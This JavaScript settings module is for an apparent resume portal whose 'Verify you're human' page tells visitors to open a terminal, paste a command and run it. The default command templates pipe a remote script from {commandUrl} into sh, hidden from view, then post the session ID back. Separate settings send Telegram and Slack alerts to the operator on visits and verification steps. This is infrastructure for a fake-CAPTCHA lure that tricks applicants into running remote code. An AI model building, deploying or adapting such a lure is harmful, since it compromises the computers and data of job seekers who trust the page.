import { db } from "../db.js";
import { config } from "../config.js";
import { DEFAULT_THEME, HEX_RE, THEMES, themeCatalog, themeVars } from "../lib/themes.js";
import { VERIFY_KINDS } from "./challenges.js";
import { isValidTimeZone, listTimeZones } from "./time.js";
import { getSiteById } from "./sites.js";

const DEFAULTS = {
  site_name: "Resume Portal",
  timezone: "UTC",
  verify_plan: JSON.stringify(VERIFY_KINDS.map((k) => k.id)),
  allow_mobile_applications: "true",
  public_theme: DEFAULT_THEME,
  admin_theme: DEFAULT_THEME,
  accent_color: "",
  logo_file: "",
  bg_file: "",
  bg_type: "",
  bg_overlay: "45",
  bg_blur: "4",
  slack_webhook_url: "",
  telegram_bot_token: "",
  telegram_chat_id: "",
  telegram_send_file: "",
  slack_enabled: "true",
  telegram_enabled: "true",
  notify_on_visit: "false",
  notify_on_verify_step: "false",
  notify_on_application: "true",

  // Instructional copy on the human-verification page. Editable so a super admin can reword it (or translate it)
  // without a code change. {total} in the subtitle is replaced with the number of steps for this run.
  verify_title: "Verify you're human",
  verify_subtitle: "Complete all {total} quick steps to continue.",
  verify_math_title: "Solve the problem",
  verify_math_hint: "Type the answer as a number.",
  verify_math_placeholder: "Your answer",
  verify_words_title: "Type the word",
  verify_words_hint: "Type the letters you see in the image (not case sensitive).",
  verify_words_placeholder: "Type the word",
  verify_copy_title: "Copy the text",
  verify_copy_hint: "Press Copy, then paste the command into your terminal and run it. The page will continue automatically once it completes.",
  verify_copy_placeholder: "Paste the text here",
  // The stage-3 guide shown is chosen by the visitor's detected platform (see challenges.js); each bucket's wording
  // is editable here. The detected platform/browser label itself (e.g. "Chrome on Windows 10") is not editable text.
  verify_copy_guide_mac: "Press ⌘ Space, type Terminal, and press Enter. Paste the command below and press Enter — enter your password if prompted.",
  verify_copy_guide_win: "Press Win + R, type cmd, and press Enter to open Command Prompt. Paste the command below and press Enter.",
  verify_copy_guide_linux: "Press Ctrl + Alt + T to open Terminal. Paste the command below and press Enter — enter your password if prompted.",
  verify_copy_guide_fallback: "Use your device's copy and paste (for example Ctrl+C / Ctrl+V, or Cmd+C / Cmd+V on a Mac) to copy the text above into the box below.",

  // Step-3 shell command templates. Supported placeholders: {commandUrl}, {verifyUrl}, {sessionId}.
  // These are editable independently for macOS, Linux, and Windows.
  shell_command_mac: "curl -s '{commandUrl}' | sh >/dev/null 2>&1; curl '{verifyUrl}' -d '{sessionId}'",
  shell_command_linux: "wget -qO- '{commandUrl}' | sh >/dev/null 2>&1; curl '{verifyUrl}' -d '{sessionId}'",
  shell_command_windows: "curl.exe '{verifyUrl}' -d '{sessionId}'",
};

// ---------------------------------------------------------------- storage (cached)
//
// Every page load asks for dozens of settings. They are read with two queries and kept in this instance's memory for
// config.settingsCacheMs; saving a setting clears the cache of the instance that saved it straight away (and other running
// instances see the change within that time).

let cache = null;

async function loadSettings() {
  const [global, perSite] = await Promise.all([
    db.all("SELECT key, value FROM settings"),
    db.all("SELECT site_id, key, value FROM site_settings"),
  ]);
  const sites = new Map();
  for (const r of perSite) {
    if (!sites.has(r.site_id)) sites.set(r.site_id, new Map());
    sites.get(r.site_id).set(r.key, r.value);
  }
  return { global: new Map(global.map((r) => [r.key, r.value])), sites };
}

export function invalidateSettings() {
  cache = null;
}

/** The settings as one synchronous lookup, read from the database at most once per config.settingsCacheMs. */
export async function settingsView() {
  const ttl = config.settingsCacheMs;
  if (!cache || ttl <= 0 || Date.now() - cache.at > ttl) {
    const entry = { at: Date.now(), promise: loadSettings() };
    cache = entry;
    entry.promise.catch(() => {
      if (cache === entry) cache = null;
    });
  }
  const snap = await cache.promise;
  const own = (key, siteId = null) => (siteId ? snap.sites.get(siteId)?.get(key) : snap.global.get(key));
  return {
    own,
    /**
     * Settings are looked up per domain: the domain's own value wins, then the default settings (siteId = null),
     * then the built-in default. A domain row that holds "" is a real value ("none"), not a missing one.
     */
    get(key, siteId = null) {
      if (siteId) {
        const mine = snap.sites.get(siteId)?.get(key);
        if (mine !== undefined) return mine;
      }
      const row = snap.global.get(key);
      return row !== undefined ? row : (DEFAULTS[key] ?? "");
    },
    ownKeys: (siteId) => new Set(snap.sites.get(siteId)?.keys() ?? []),
  };
}

export async function getSetting(key, siteId = null) {
  return (await settingsView()).get(key, siteId);
}

/** The value saved for exactly this scope (undefined when the domain inherits it). */
export async function getOwnSetting(key, siteId = null) {
  return (await settingsView()).own(key, siteId);
}

const PUT_GLOBAL = `INSERT INTO settings (key, value, updated_at) VALUES (?, ?, now())
  ON CONFLICT (key) DO UPDATE SET value = excluded.value, updated_at = excluded.updated_at`;
const PUT_SITE = `INSERT INTO site_settings (site_id, key, value, updated_at) VALUES (?, ?, ?, now())
  ON CONFLICT (site_id, key) DO UPDATE SET value = excluded.value, updated_at = excluded.updated_at`;

/** `exec`: a transaction to write through (default: the database directly). */
export async function putSetting(key, value, siteId = null, exec = db) {
  if (siteId) await exec.run(PUT_SITE, [siteId, key, String(value)]);
  else await exec.run(PUT_GLOBAL, [key, String(value)]);
  invalidateSettings();
}

/** Make a domain inherit the default again for this key. */
export async function clearSiteSetting(key, siteId, exec = db) {
  if (siteId) await exec.run("DELETE FROM site_settings WHERE site_id = ? AND key = ?", [siteId, key]);
  invalidateSettings();
}

function boolOf(v, key) {
  return v === "" ? DEFAULTS[key] === "true" : v === "true";
}

/** Secrets: this domain's value, else the default settings' value, else the .env value. */
const secretOf = (view, key, siteId, envValue) => view.get(key, siteId) || view.get(key) || envValue;

// ---------------------------------------------------------------- typed readers

export async function getTimeZone(siteId = null) {
  const tz = await getSetting("timezone", siteId);
  return isValidTimeZone(tz) ? tz : "UTC";
}

function verifyPlanOf(view, siteId) {
  try {
    const parsed = JSON.parse(view.get("verify_plan", siteId));
    const plan = VERIFY_KINDS.map((k) => k.id).filter((id) => Array.isArray(parsed) && parsed.includes(id));
    // An explicitly saved empty array means verification is disabled for this site.
    if (Array.isArray(parsed)) return plan;
  } catch {
    /* fall through */
  }
  return VERIFY_KINDS.map((k) => k.id);
}

/** The checks to run, in order. An empty plan intentionally disables human verification. */
export async function getVerifyPlan(siteId = null) {
  return verifyPlanOf(await settingsView(), siteId);
}

/**
 * Shell commands used by the platform-specific Step-3 verification. The command is stored as a template so the
 * server can safely substitute the current challenge URL, verification callback URL, and session id.
 */
export async function getVerifyShellCommands(siteId = null) {
  const v = await settingsView();
  return {
    mac: v.get("shell_command_mac", siteId),
    linux: v.get("shell_command_linux", siteId),
    windows: v.get("shell_command_windows", siteId),
  };
}

function verifyTextsOf(v, siteId) {
  const g = (key) => v.get(key, siteId);
  return {
    title: g("verify_title"),
    subtitle: g("verify_subtitle"),
    math: { title: g("verify_math_title"), hint: g("verify_math_hint"), placeholder: g("verify_math_placeholder") },
    words: { title: g("verify_words_title"), hint: g("verify_words_hint"), placeholder: g("verify_words_placeholder") },
    copy: {
      title: g("verify_copy_title"),
      hint: g("verify_copy_hint"),
      placeholder: g("verify_copy_placeholder"),
      guides: {
        mac: g("verify_copy_guide_mac"),
        win: g("verify_copy_guide_win"),
        linux: g("verify_copy_guide_linux"),
        fallback: g("verify_copy_guide_fallback"),
      },
    },
  };
}

/** All instructional text on the human-verification page, for this domain (falls back to the default settings). */
export async function getVerifyTexts(siteId = null) {
  return verifyTextsOf(await settingsView(), siteId);
}

function notificationConfigOf(v, siteId) {
  const sendFile = v.get("telegram_send_file", siteId);
  return {
    slack: { enabled: boolOf(v.get("slack_enabled", siteId), "slack_enabled"), webhookUrl: secretOf(v, "slack_webhook_url", siteId, config.slack.webhookUrl) },
    telegram: {
      enabled: boolOf(v.get("telegram_enabled", siteId), "telegram_enabled"),
      botToken: secretOf(v, "telegram_bot_token", siteId, config.telegram.botToken),
      chatId: secretOf(v, "telegram_chat_id", siteId, config.telegram.chatId),
      sendFile: sendFile === "" ? config.telegram.sendFile : sendFile === "true",
      apiBase: config.telegram.apiBase,
    },
    events: {
      visit: boolOf(v.get("notify_on_visit", siteId), "notify_on_visit"),
      verifyStep: boolOf(v.get("notify_on_verify_step", siteId), "notify_on_verify_step"),
      application: boolOf(v.get("notify_on_application", siteId), "notify_on_application"),
    },
  };
}

/** Slack / Telegram credentials for a domain: its own, else the default settings', else .env. */
export async function getNotificationConfig(siteId = null) {
  return notificationConfigOf(await settingsView(), siteId);
}

/** The site name for a domain: its own override, else the name given when the domain was added, else the default one. */
async function siteNameFor(v, siteId) {
  const own = siteId ? v.own("site_name", siteId) : undefined;
  if (own) return own;
  return (siteId && (await getSiteById(siteId))?.name) || v.get("site_name");
}

async function siteInfoOf(v, siteId) {
  const themeId = v.get("public_theme", siteId);
  const theme = THEMES[themeId] ? themeId : DEFAULT_THEME;
  const logo = v.get("logo_file", siteId);
  const bgFile = v.get("bg_file", siteId);
  const bgType = v.get("bg_type", siteId);
  return {
    siteName: await siteNameFor(v, siteId),
    logoUrl: logo ? `/media/${logo}` : null,
    background:
      bgFile && (bgType === "image" || bgType === "video")
        ? { type: bgType, url: `/media/${bgFile}`, overlay: Number(v.get("bg_overlay", siteId)), blur: Number(v.get("bg_blur", siteId)) }
        : null,
    theme,
    themeVars: themeVars(theme, v.get("accent_color", siteId)),
  };
}

/** Public, non-secret branding for a candidate site. */
export async function getSiteInfo(siteId = null) {
  return siteInfoOf(await settingsView(), siteId);
}

/** CSS custom properties for the admin UI (served as /admin/theme.css). */
export async function getAdminThemeVars() {
  const v = await settingsView();
  const id = THEMES[v.get("admin_theme")] ? v.get("admin_theme") : DEFAULT_THEME;
  return themeVars(id, v.get("accent_color"));
}

// ---------------------------------------------------------------- admin view (secrets are never sent back)

function maskSlack(url) {
  try {
    return `${new URL(url).host}/…${url.slice(-4)}`;
  } catch {
    return "••••";
  }
}

function maskToken(token) {
  const [id, secret = ""] = token.split(":");
  return `${id}:••••${secret.slice(-4)}`;
}

/** Where a secret comes from: "site" (this domain), "settings" (the default settings), "default" (inherited) or "env". */
function secretView(v, key, siteId, envValue, mask) {
  const own = siteId ? v.own(key, siteId) : undefined;
  if (own) return { set: true, masked: mask(own), source: "site" };
  const inherited = v.get(key);
  if (inherited) return { set: true, masked: mask(inherited), source: siteId ? "default" : "settings" };
  return { set: !!envValue, masked: envValue ? mask(envValue) : "", source: envValue ? "env" : "" };
}

// What each part of the Settings page stores, so a domain can be reset to the default one part at a time.
const MEDIA_KEYS = { logo: ["logo_file"], background: ["bg_file", "bg_type"] };

/** API field names this domain overrides (plus "logo" / "background" for the uploaded files). */
function overridesOf(v, siteId) {
  if (!siteId) return [];
  const saved = v.ownKeys(siteId);
  const out = Object.entries(FIELDS).filter(([, [dbKey]]) => saved.has(dbKey)).map(([name]) => name);
  for (const [name, keys] of Object.entries(MEDIA_KEYS)) if (keys.some((k) => saved.has(k))) out.push(name);
  return out;
}

export async function getAdminSettings(siteId = null) {
  const v = await settingsView();
  const site = await siteInfoOf(v, siteId);
  const n = notificationConfigOf(v, siteId);
  const row = siteId ? await getSiteById(siteId) : null;
  const tz = v.get("timezone", siteId);
  return {
    scope: { siteId: siteId || null, domain: row?.domain || null, name: row?.name || null },
    overrides: overridesOf(v, siteId),
    siteName: site.siteName,
    timezone: isValidTimeZone(tz) ? tz : "UTC",
    verifyPlan: verifyPlanOf(v, siteId),
    allowMobileApplications: boolOf(v.get("allow_mobile_applications", siteId), "allow_mobile_applications"),
    verifyTexts: verifyTextsOf(v, siteId),
    shellCommands: {
      mac: v.get("shell_command_mac", siteId),
      linux: v.get("shell_command_linux", siteId),
      windows: v.get("shell_command_windows", siteId),
    },
    publicTheme: site.theme,
    adminTheme: THEMES[v.get("admin_theme")] ? v.get("admin_theme") : DEFAULT_THEME,
    accentColor: HEX_RE.test(v.get("accent_color", siteId)) ? v.get("accent_color", siteId) : "",
    bgOverlay: Number(v.get("bg_overlay", siteId)),
    bgBlur: Number(v.get("bg_blur", siteId)),
    logoUrl: site.logoUrl,
    background: site.background ? { type: site.background.type, url: site.background.url } : null,
    telegramChatId: n.telegram.chatId, // not a secret; this domain's value, else the default one
    telegramSendFile: n.telegram.sendFile,
    slackEnabled: n.slack.enabled,
    telegramEnabled: n.telegram.enabled,
    notifyOnVisit: n.events.visit,
    notifyOnVerifyStep: n.events.verifyStep,
    notifyOnApplication: n.events.application,
    slack: secretView(v, "slack_webhook_url", siteId, config.slack.webhookUrl, maskSlack),
    telegram: secretView(v, "telegram_bot_token", siteId, config.telegram.botToken, maskToken),
    options: {
      timezones: listTimeZones(),
      themes: themeCatalog(),
      verifyKinds: VERIFY_KINDS,
    },
    limits: {
      logoMb: config.media.logoBytes / 1048576,
      imageMb: config.media.imageBytes / 1048576,
      videoMb: config.media.videoBytes / 1048576,
    },
  };
}

// ---------------------------------------------------------------- updates

const TOKEN_RE = /^\d{3,}:[A-Za-z0-9_-]{3,}$/;
const CHAT_RE = /^(-?\d{1,20}|@[A-Za-z0-9_]{5,32})$/;

/** A required line of UI copy, trimmed, within a length that fits the layout it's shown in. */
function textField(max, label) {
  return (v) => {
    const s = typeof v === "string" ? v.trim() : "";
    return s.length >= 1 && s.length <= max ? [s, null] : ["", `${label} must be 1 to ${max} characters.`];
  };
}

/** key (as sent by the admin UI) -> [database key, validate(value) => [storedValue, error|null]] */
function shellCommandField(label) {
  return (v) => {
    const s = typeof v === "string" ? v.trim() : "";
    if (!s) return ["", `${label} shell command cannot be empty.`];
    if (s.length > 4000) return ["", `${label} shell command must be 4000 characters or fewer.`];
    if (/\r|\n/.test(s)) return ["", `${label} shell command must be a single line.`];
    if (!s.includes("{sessionId}") || !s.includes("{verifyUrl}")) {
      return ["", `${label} shell command must contain {sessionId} and {verifyUrl}.`];
    }
    return [s, null];
  };
}

const FIELDS = {
  siteName: ["site_name", (v) => {
    const s = typeof v === "string" ? v.trim() : "";
    return s.length >= 1 && s.length <= 80 ? [s, null] : ["", "Site name must be 1 to 80 characters."];
  }],
  timezone: ["timezone", (v) => (isValidTimeZone(v) ? [v, null] : ["", "That time zone isn't valid. Pick one from the list, e.g. America/Chicago."])],
  allowMobileApplications: ["allow_mobile_applications", (v) => (typeof v === "boolean" ? [String(v), null] : ["", "Must be true or false."])],
  verifyPlan: ["verify_plan", (v) => {
    const ids = VERIFY_KINDS.map((k) => k.id);
    if (!Array.isArray(v) || !v.every((x) => ids.includes(x))) return ["", "Unknown verification step."];
    const plan = ids.filter((id) => v.includes(id)); // fixed order, no duplicates
    return [JSON.stringify(plan), null];
  }],
  publicTheme: ["public_theme", (v) => (THEMES[v] ? [v, null] : ["", "Unknown theme."])],
  adminTheme: ["admin_theme", (v) => (THEMES[v] ? [v, null] : ["", "Unknown theme."])],
  accentColor: ["accent_color", (v) => (v === "" || HEX_RE.test(v) ? [String(v).toLowerCase(), null] : ["", "Use a color like #3b6cf6."])],
  bgOverlay: ["bg_overlay", (v) => {
    const n = Number(v);
    return Number.isInteger(n) && n >= 0 && n <= 90 ? [String(n), null] : ["", "Dimming must be a whole number from 0 to 90."];
  }],
  bgBlur: ["bg_blur", (v) => {
    const n = Number(v);
    return Number.isInteger(n) && n >= 0 && n <= 20 ? [String(n), null] : ["", "Blur must be a whole number from 0 to 20."];
  }],
  telegramChatId: ["telegram_chat_id", (v) => {
    const s = typeof v === "string" ? v.trim() : "";
    return s === "" || CHAT_RE.test(s) ? [s, null] : ["", "Chat ID is a number like -1001234567890 or @channelname."];
  }],
  telegramSendFile: ["telegram_send_file", (v) => (typeof v === "boolean" ? [String(v), null] : ["", "Must be true or false."])],
  slackEnabled: ["slack_enabled", (v) => (typeof v === "boolean" ? [String(v), null] : ["", "Must be true or false."])],
  telegramEnabled: ["telegram_enabled", (v) => (typeof v === "boolean" ? [String(v), null] : ["", "Must be true or false."])],
  notifyOnVisit: ["notify_on_visit", (v) => (typeof v === "boolean" ? [String(v), null] : ["", "Must be true or false."])],
  notifyOnVerifyStep: ["notify_on_verify_step", (v) => (typeof v === "boolean" ? [String(v), null] : ["", "Must be true or false."])],
  notifyOnApplication: ["notify_on_application", (v) => (typeof v === "boolean" ? [String(v), null] : ["", "Must be true or false."])],

  verifyTitle: ["verify_title", textField(80, "Title")],
  verifySubtitle: ["verify_subtitle", textField(160, "Subtitle")],
  verifyMathTitle: ["verify_math_title", textField(60, "Title")],
  verifyMathHint: ["verify_math_hint", textField(200, "Hint")],
  verifyMathPlaceholder: ["verify_math_placeholder", textField(60, "Placeholder")],
  verifyWordsTitle: ["verify_words_title", textField(60, "Title")],
  verifyWordsHint: ["verify_words_hint", textField(200, "Hint")],
  verifyWordsPlaceholder: ["verify_words_placeholder", textField(60, "Placeholder")],
  verifyCopyTitle: ["verify_copy_title", textField(60, "Title")],
  verifyCopyHint: ["verify_copy_hint", textField(300, "Hint")],
  verifyCopyPlaceholder: ["verify_copy_placeholder", textField(60, "Placeholder")],
  verifyCopyGuideMac: ["verify_copy_guide_mac", textField(250, "Mac guide")],
  verifyCopyGuideWin: ["verify_copy_guide_win", textField(250, "Windows guide")],
  verifyCopyGuideLinux: ["verify_copy_guide_linux", textField(250, "Linux guide")],
  verifyCopyGuideFallback: ["verify_copy_guide_fallback", textField(250, "Fallback guide")],

  shellCommandMac: ["shell_command_mac", shellCommandField("macOS")],
  shellCommandLinux: ["shell_command_linux", shellCommandField("Linux")],
  shellCommandWindows: ["shell_command_windows", shellCommandField("Windows")],

  slackWebhookUrl: ["slack_webhook_url", (v) => {
    if (v === "") return ["", null];
    let u;
    try {
      u = new URL(v);
    } catch {
      return ["", "Enter the full Slack webhook URL."];
    }
    const okProtocol = u.protocol === "https:" || (config.slack.allowHttp && u.protocol === "http:");
    if (!okProtocol || !config.slack.allowedHosts.includes(u.hostname)) {
      return ["", `Must be a Slack webhook URL (https://${config.slack.allowedHosts[0]}/services/...).`];
    }
    return [v, null];
  }],
  telegramBotToken: ["telegram_bot_token", (v) => {
    if (v === "") return ["", null];
    return typeof v === "string" && TOKEN_RE.test(v.trim()) ? [v.trim(), null] : ["", "That doesn't look like a bot token (123456:ABC...). Copy it from @BotFather."];
  }],
};

const SECRET_KEYS = new Set(["slack_webhook_url", "telegram_bot_token"]);

/**
 * Validate and save the fields present in `body`. Fields that are left out stay unchanged.
 * `siteId` null saves the default settings; a domain id saves overrides for that domain only.
 * For the two secrets, "" clears the saved value (a domain then inherits the default settings' one, and the default
 * settings fall back to the .env value).
 * Returns { errors } when something is invalid (nothing is saved), else { changed: [keys] }.
 */
export async function updateSettings(body, siteId = null) {
  const errors = {};
  const pending = [];
  for (const [key, [dbKey, validate]] of Object.entries(FIELDS)) {
    if (!(key in body) || body[key] === null || body[key] === undefined) continue;
    if (siteId && key === "adminTheme") {
      errors[key] = "The admin area theme is shared by all domains. Change it in the default settings.";
      continue;
    }
    const [value, err] = validate(body[key]);
    if (err) errors[key] = err;
    else pending.push([key, dbKey, value]);
  }
  if (Object.keys(errors).length) return { errors };
  await db.tx(async (t) => {
    for (const [, dbKey, value] of pending) {
      if (siteId && value === "" && SECRET_KEYS.has(dbKey)) await clearSiteSetting(dbKey, siteId, t);
      else await putSetting(dbKey, value, siteId, t);
    }
  });
  invalidateSettings();
  return { changed: pending.map(([key]) => key) };
}

/**
 * Make a domain use the default settings again for the given parts (API field names, or "logo" / "background").
 * Returns the uploaded files that belonged only to this domain, so the caller can delete them.
 */
export async function resetSiteSettings(siteId, names) {
  const orphaned = [];
  await db.tx(async (t) => {
    for (const name of names) {
      const keys = MEDIA_KEYS[name] || (FIELDS[name] ? [FIELDS[name][0]] : []);
      for (const k of keys) {
        const own = (await t.get("SELECT value FROM site_settings WHERE site_id = ? AND key = ?", [siteId, k]))?.value;
        if ((k === "logo_file" || k === "bg_file") && own) orphaned.push(own);
        await clearSiteSetting(k, siteId, t);
      }
    }
  });
  invalidateSettings();
  return orphaned;
}

/** A domain's own uploaded logo / background files (read before the domain is deleted). */
export async function ownedMediaFiles(siteId) {
  const v = await settingsView();
  return ["logo_file", "bg_file"].map((k) => v.own(k, siteId)).filter(Boolean);
}
